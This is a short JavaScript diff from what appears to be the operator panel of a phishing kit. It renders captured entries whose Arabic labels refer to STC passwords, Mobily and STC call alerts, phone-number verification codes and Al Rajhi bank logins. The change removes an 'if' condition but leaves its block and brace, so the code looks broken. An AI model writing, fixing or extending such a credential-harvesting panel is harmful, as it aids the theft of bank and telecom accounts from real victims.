@@ -1811,7 +1811,7 @@
             
             const __kddPg = dataEntry.page || 'بيانات';
             const __kddHasBtns = ['توثيق رقم الجوال', 'كلمة مرور STC', 'تنبية إتصال STC', 'تنبية إتصال Mobily', 'تسجيل الدخول الراجحى'].indexOf(__kddPg) >= 0 || !!(dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز');
-            if (__kddHasBtns) {
+            
               html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
             html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
             try {
